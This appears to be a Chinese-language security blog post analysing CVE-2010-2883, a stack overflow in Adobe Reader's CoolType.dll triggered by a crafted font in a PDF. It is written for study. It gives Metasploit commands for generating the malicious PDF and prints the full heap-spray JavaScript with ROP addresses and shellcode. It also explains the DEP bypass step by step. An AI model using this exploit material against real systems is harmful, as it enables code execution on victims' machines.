<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.8.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"21guns.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="[TOC] 01-漏洞描述 漏洞战争：Adobe Reader 和 Acrobat中的 Cooltype.dll 库在解析字体文件 SING 表中的 UniqueName项时存在的栈溢出漏洞，用户受骗打开了特制的 PDF 文件就有可能导致执行任意代码 https://cve.mitre.org：Stack-based buffer overflow in CoolType.dll in Adobe">
<meta name="keywords" content="漏洞分析">
<meta property="og:type" content="article">
<meta property="og:title" content="cve-2010-2883漏洞分析（栈溢出）">
<meta property="og:url" content="http://21guns.top/2020/01/11/reverse/cve-2010-2883漏洞分析（栈溢出）/index.html">
<meta property="og:site_name" content="have a nice day">
<meta property="og:description" content="[TOC] 01-漏洞描述 漏洞战争：Adobe Reader 和 Acrobat中的 Cooltype.dll 库在解析字体文件 SING 表中的 UniqueName项时存在的栈溢出漏洞，用户受骗打开了特制的 PDF 文件就有可能导致执行任意代码 https://cve.mitre.org：Stack-based buffer overflow in CoolType.dll in Adobe">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135319.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135332.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135312.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-10-081312.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135335.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135336.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135327.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-10-081311.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-10-081310.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-10-81311.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135324.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135338.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135329.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135328.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135333.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135321.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135340.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135331.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135317.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135334.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135310.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135320.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135313.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135326.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135337.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135339.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135318.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135322.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135315.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135311.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135314.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135323.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135325.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135316.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135330.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-10-081309.jpg">
<meta property="og:updated_time" content="2022-03-01T07:47:20.457Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="cve-2010-2883漏洞分析（栈溢出）">
<meta name="twitter:description" content="[TOC] 01-漏洞描述 漏洞战争：Adobe Reader 和 Acrobat中的 Cooltype.dll 库在解析字体文件 SING 表中的 UniqueName项时存在的栈溢出漏洞，用户受骗打开了特制的 PDF 文件就有可能导致执行任意代码 https://cve.mitre.org：Stack-based buffer overflow in CoolType.dll in Adobe">
<meta name="twitter:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135319.jpg">

<link rel="canonical" href="http://21guns.top/2020/01/11/reverse/cve-2010-2883漏洞分析（栈溢出）/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>cve-2010-2883漏洞分析（栈溢出） | have a nice day</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">have a nice day</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2020/01/11/reverse/cve-2010-2883漏洞分析（栈溢出）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          cve-2010-2883漏洞分析（栈溢出）
        </h1>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-01-11 11:31:13" itemprop="dateCreated datePublished" datetime="2020-01-11T11:31:13+08:00">2020-01-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-03-01 15:47:20" itemprop="dateModified" datetime="2022-03-01T15:47:20+08:00">2022-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/软件安全-逆向/" itemprop="url" rel="index"><span itemprop="name">软件安全/逆向</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>[TOC]</p>
<h1 id="01-漏洞描述"><a href="#01-漏洞描述" class="headerlink" title="01-漏洞描述"></a>01-漏洞描述</h1><ul>
<li>漏洞战争：Adobe Reader 和 Acrobat中的 Cooltype.dll 库在解析字体文件 SING 表中的 UniqueName项时存在的栈溢出漏洞，用户受骗打开了特制的 PDF 文件就有可能导致执行任意代码</li>
<li><a href="https://cve.mitre.org：Stack-based" target="_blank" rel="noopener">https://cve.mitre.org：Stack-based</a> buffer overflow in CoolType.dll in Adobe Reader and Acrobat 9.x before 9.4, and 8.x before 8.2.5 on Windows and Mac OS X, allows remote attackers to execute arbitrary code or cause a denial of service (application crash) via a PDF document with a long field in a Smart INdependent Glyphlets (SING) table in a TTF font, as exploited in the wild in September 2010.</li>
</ul>
<h1 id="02-测试环境"><a href="#02-测试环境" class="headerlink" title="02-测试环境"></a>02-测试环境</h1><ul>
<li>目标系统：Windows7 专业版（虚拟机</li>
<li>OllyDebug：动态调试</li>
<li>IDA Pro：静态分析</li>
<li>PdfStreamDumper：提取PDF数据</li>
<li>Adobe Reader 9.3.4：漏洞软件</li>
<li>Metasploit：复现漏洞<a id="more"></a></li>
</ul>
<h1 id="03-漏洞复现"><a href="#03-漏洞复现" class="headerlink" title="03-漏洞复现"></a>03-漏洞复现</h1><ol>
<li><p>msf生成恶意文件</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 搜索并使用模块</span></span><br><span class="line">msf5 &gt; search cve-2010-2883</span><br><span class="line">msf5 &gt; use exploit/windows/fileformat/adobe_cooltype_sing</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置payload</span></span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set payload windows/exec</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置参数：弹出计算器</span></span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set cmd calc.exe</span><br><span class="line"><span class="meta">#</span><span class="bash"> 攻击：生成恶意pdf文件</span></span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; exploit</span><br></pre></td></tr></table></figure>
</li>
<li><p>恶意文件复制到目标机，Adobe Reader打开，成功弹出计算器</p>
</li>
<li><p>PS：也可设置payload为强大的meterpreter，获取反弹shell</p>
</li>
</ol>
<h1 id="04-准备工作"><a href="#04-准备工作" class="headerlink" title="04-准备工作"></a>04-准备工作</h1><h2 id="4-1-漏洞定位-基于字符串"><a href="#4-1-漏洞定位-基于字符串" class="headerlink" title="4.1-漏洞定位-基于字符串"></a>4.1-漏洞定位-基于字符串</h2><ol>
<li><p>根据漏洞描述，得关键字符串：“SING”、漏洞所在文件：Cooltype.dll </p>
</li>
<li><p>IDA静态分析：打开Cooltype.dll ，Alt+t搜索“SING”，获得多条记录</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135319.jpg" alt="image-20200109153945146"></p>
</li>
<li><p>依次进入检查是否有敏感代码：记录2地址0803DD74处，发现敏感函数strcat，其在拼接字符串时，若不进行长度检查，则会造成栈溢出，初步断定strcat处为溢出点</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135332.jpg" alt="image-20200109154723463"></p>
</li>
<li><p>详细分析溢出点所在函数的代码块（三处关键点</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135312.jpg" alt="image-20200109171058551"></p>
</li>
</ol>
<h2 id="4-2-判定安全机制"><a href="#4-2-判定安全机制" class="headerlink" title="4.2-判定安全机制"></a>4.2-判定安全机制</h2><ul>
<li><p>GS：由IDA中汇编代码分析，函数开始处有安全cookie，因此判定存在GS机制</p>
</li>
<li><p>DEP：数据执行保护，即没有执行权限的内存空间不允许执行代码，这已然成为程序标配</p>
</li>
<li><p>ASLR：地址空间布局随机化，包含映像随机化与堆栈随机化，010Editor打开目标exe，找到相关字段，发现已开启</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-10-081312.jpg" alt="image-20200110153747769"></p>
</li>
</ul>
<h2 id="4-3-SING表结构分析"><a href="#4-3-SING表结构分析" class="headerlink" title="4.3-SING表结构分析"></a>4.3-SING表结构分析</h2><ol>
<li><p>PDFStreamDumper打开恶意pdf文件，菜单-Search For-TTF fonts，搜索ttf所在Object，自动跳转到第10个，本Object中，ctrl+f搜索字符串“SING”，如下</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135335.jpg" alt="image-20200109191201941"></p>
</li>
<li><p>TTF中关于SING表的TableEntry（可理解为SING头）结构如下，找到SING表主体所在位置：0000011C</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> sturct_SING</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> tag[<span class="number">4</span>];<span class="comment">//"SING"</span></span><br><span class="line">    ULONG checkSum;<span class="comment">//校验和</span></span><br><span class="line">    ULONG offset;<span class="comment">//相对文件偏移，0000011C</span></span><br><span class="line">    ULONG length;<span class="comment">//数据长度</span></span><br><span class="line">&#125; TableEntry;</span><br></pre></td></tr></table></figure>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135336.jpg" alt="image-20200109192548467"></p>
</li>
<li><p>SING表结构如下，偏移为0x10处为uniqueName字段处，即上图0x0000012C处</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135327.jpg" alt="image-20200109192803886"></p>
</li>
</ol>
<h2 id="4-4-JS堆喷射代码"><a href="#4-4-JS堆喷射代码" class="headerlink" title="4.4-JS堆喷射代码"></a>4.4-JS堆喷射代码</h2><ol>
<li><p>PDFStreamDumper打开恶意pdf文件，在第一个object处找到OpenAction，表示其在第11个obj中，PDF运行时会执行里面脚本</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-10-081311.jpg" alt="image-20200110150253963"></p>
</li>
<li><p>进入第11个obj，表示执行的js代码位于第12个obj中</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-10-081310.jpg" alt="image-20200110150415569"></p>
</li>
<li><p>进入12obj，发现实现堆喷射的js脚本</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-10-81311.jpg" alt="image-20200110150527026"></p>
</li>
<li><p>目测代码是经过混淆过的，简单整理后获得js代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>( <span class="string">'%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%ud7da%u82ba%ube98%ud9de%u2474%u5ef4%uc931%u31b1%uee83%u31fc%u1456%u5603%u7a96%u224b%uf87e%udbb4%u9d7e%u3e3d%u9d4f%u4a5a%u2dff%u1e28%uc6f3%u8b7c%uab80%ubca8%u0121%uf38f%u3ab2%u92f3%u4130%u7520%u8a09%u7435%uf74e%u24b4%u7307%ud96a%uc92c%u52b7%udf7e%u87bf%ude36%u19ee%ub94d%u9b30%ub182%u8378%ufcc7%u3833%u8a33%ue8c5%u730a%ud569%u86a3%u1173%u7903%u6b06%u0470%ua811%ud20b%u2b94%u91ab%u900f%u754a%u53c9%u3240%u3c9d%uc544%u3772%u4e70%u9875%u14f1%u3c52%uce5a%u65fb%ua106%u7504%u1ee9%ufda1%u4a07%u5fd8%u8d4d%uda6e%u8d23%ue570%ue613%u6e41%u71fc%ua55e%u8eb9%ue414%u06eb%u7cf1%u4aae%uab02%u72ec%u5e81%u808c%u2a99%ucd89%uc61d%u5ee3%ue8c8%u5e50%u8ad9%ucc37%u6281%u74d2%u7b23'</span> );</span><br><span class="line"><span class="keyword">var</span> nop = <span class="built_in">unescape</span>( <span class="string">"%"</span> + <span class="string">"u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"%u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> );</span><br><span class="line"><span class="keyword">while</span> (nop.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>) </span><br><span class="line">  nop+=nop;</span><br><span class="line">d = nop.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span><span class="number">-0x24</span>)/<span class="number">2</span>);</span><br><span class="line">d += shellcode;</span><br><span class="line">d += nop;</span><br><span class="line">e = d.substring(<span class="number">0</span>, <span class="number">65536</span>/<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(e.length &lt; <span class="number">0x80000</span>) </span><br><span class="line">  e += e;</span><br><span class="line">h = e.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span><span class="number">-0x08</span>) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> slide = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">0x1f0</span>;i++) </span><br><span class="line">  slide[i]=h+<span class="string">"s"</span>;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="05-Exploit脚本分析"><a href="#05-Exploit脚本分析" class="headerlink" title="05-Exploit脚本分析"></a>05-Exploit脚本分析</h1><p>脚本文件：adobe_cooltype_sing.rb</p>
<h2 id="5-1-exploit"><a href="#5-1-exploit" class="headerlink" title="5.1-exploit()"></a>5.1-exploit()</h2><p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135324.jpg" alt="image-20200109200855435"></p>
<h2 id="5-2-make-ttf"><a href="#5-2-make-ttf" class="headerlink" title="5.2-make_ttf()"></a>5.2-make_ttf()</h2><ul>
<li><p>构建ttf，主要是其内部的SING表-UniqueName字段</p>
</li>
<li><p>其中有3处需要注意：</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135338.jpg" alt="image-20200109202036314"></p>
</li>
<li><p>0x4a80cb38和0x4a82a714是两个ROP块的起始地址，二者均位于icucnv36.dll文件中；（出自《漏洞战争》：在 Adobe Reader 的各版本上，这个 dll 上的这两处地址是始终不变的，因而保持了各版本的兼容性和 Exploit 的稳定性）；</p>
</li>
<li><p>0x0c0c0c0c是作为上述两ROP块跳转后，新的ESP地址，一旦retn，eip=[0x0c0c0c0c]，便可以获取程序执行流程，以呼应后面js中的堆喷射</p>
</li>
</ul>
<h2 id="5-3-make-js"><a href="#5-3-make-js" class="headerlink" title="5.3-make_js()"></a>5.3-make_js()</h2><ul>
<li><p>构造一个ROP块，内含多个API，以绕过数据执行保护DEP</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135329.jpg" alt="image-20200109205422860"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135328.jpg" alt="image-20200109205226207"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135333.jpg" alt="image-20200109205240108"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135321.jpg" alt="image-20200109205257124"></p>
</li>
<li><p>将ROP块与msf中所选payload合并，以实现最终payload</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135340.jpg" alt="image-20200109205448483"></p>
</li>
<li><p>构建堆喷射的JS代码</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135331.jpg" alt="image-20200109205542597"></p>
</li>
</ul>
<h2 id="5-4-make-pdf"><a href="#5-4-make-pdf" class="headerlink" title="5.4-make_pdf()"></a>5.4-make_pdf()</h2><p>构建pdf文件：添加ttf、js</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135317.jpg" alt="image-20200109205947491"></p>
<h1 id="06-OD动态调试"><a href="#06-OD动态调试" class="headerlink" title="06-OD动态调试"></a>06-OD动态调试</h1><h2 id="6-1-产生溢出"><a href="#6-1-产生溢出" class="headerlink" title="6.1-产生溢出"></a>6.1-产生溢出</h2><ol>
<li><p>打开Adobe Reader，OD中附加进程，溢出点strcat处下断（因加载基址不同，位置也相应变化）</p>
</li>
<li><p>溢出前，源地址数据如下：可见是SING表中uniqueName字段的内容</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135334.jpg" alt="image-20200109194046518"></p>
</li>
<li><p>简单分析：</p>
<ul>
<li>正常情况下uniqueName字段为28字节，远远小于栈空间大小0x104（如4.1-4），故不会发生溢出；</li>
<li>但是若经过特殊构造，基于strcat复制内存时的特性（直至遇到NULL才停止），则会出现溢出</li>
<li>如上图，此字段目前已有大小0x13E+（况且还没遇到NULL），早已大于固定的栈空间大小，一定会产生溢出</li>
</ul>
</li>
<li><p>单步，执行strcat函数后，因目标地址位于栈中，因此栈遭到破坏，栈溢出发生！</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135310.jpg" alt="image-20200109194704356"></p>
</li>
<li><p>将上面复制进去的数据下内存访问断点，F9执行，前面都是些无关紧要的访问，直至遇到call（敏感操作：调用栈中的地址）</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135320.jpg" alt="image-20200109195531266"></p>
</li>
</ol>
<h2 id="6-2-ROP绕DEP"><a href="#6-2-ROP绕DEP" class="headerlink" title="6.2-ROP绕DEP"></a>6.2-ROP绕DEP</h2><ul>
<li><p>OD中，单步执行call [eax]那条指令，进入第一个ROP块</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135313.jpg" alt="image-20200109204400899"></p>
</li>
<li><p>retn后进入第二个ROP块</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135326.jpg" alt="image-20200109204432204"></p>
</li>
<li><p>执行完两个ROP后，结合JS堆喷射，便完美控制程序流程</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135337.jpg" alt="image-20200109204933899"></p>
</li>
<li><p>观察栈中数据，出现各API：CreateFileA、CreateFileMappingA、MapViewOfFile、memcpy，依次下断，观察参数</p>
</li>
<li><p>执行至CreateFileA，创建一个文件：名字-iso88951、权限-所有、属性-隐藏</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135339.jpg" alt="image-20200109210905235"></p>
</li>
<li><p>执行至CreateFileMappingA，创建映射对象：hFile为上述创建的文件句柄（文件与物理页映射，以便为程序提供共享内存）、属性为读/写/执行（绕过DEP）、大小为0x10000（存储shellcode足矣）、</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135318.jpg" alt="image-20200109211113584"></p>
</li>
<li><p>执行至MapViewOfFile，将物理页与进程虚拟地址进行映射：hMapObject为上述创建的映射对象句柄；</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135322.jpg" alt="image-20200109211759279"></p>
</li>
<li><p>执行后，发现进程虚拟空间中多了一块地址，且具有执行权限，正式iso文件映射而来的共享内存</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135315.jpg" alt="image-20200109212146437"></p>
</li>
<li><p>执行至memcpy，拷贝内存：目的地址是刚申请的具有执行权限的内存空间、而源地址应该就是shellcode所在地</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135311.jpg" alt="image-20200109212342715"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135314.jpg" alt="image-20200109212540025"></p>
</li>
</ul>
